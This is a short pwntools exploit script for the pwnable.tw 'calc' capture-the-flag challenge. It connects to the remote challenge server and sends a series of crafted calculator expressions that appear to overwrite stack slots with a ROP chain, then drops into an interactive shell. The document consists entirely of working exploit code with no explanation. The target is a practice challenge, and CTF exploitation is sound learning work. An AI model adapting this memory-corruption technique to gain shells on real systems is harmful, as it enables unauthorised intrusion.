#!/bin/python3
from pwn import *

# Setup environment
context.binary = binary = ELF('./calc')
#context.log_level = 'debug'

# Connect process 
#p = process('./calc')
p = remote('chall.pwnable.tw', 10100)

p.sendline(b'+360+30000000')
p.sendline(b'+361+104595403')
p.sendline(b'+362+1747804772')
p.sendline(b'+363-1613127866')
p.sendline(b'+364-1477943226')
p.sendline(b'+365-1343089837')
p.sendline(b'+366-1208494434')
p.sendline(b'+367-1201649203')
p.sendline(b'+368-1066972297')
p.sendline(b'+369-931787653')
p.sendline(b'+370-796934264')
p.sendline(b'+371-662257320')
p.sendline(b'+372-662257320')
p.sendline(b'+373-662257320')
p.sendline(b'+374-527072680')
p.sendline(b'+375-392477277')
p.sendline(b'+376-392477266')
p.sendline(b'+377-257957937')
p.sendline(b'h')
p.interactive()
                  
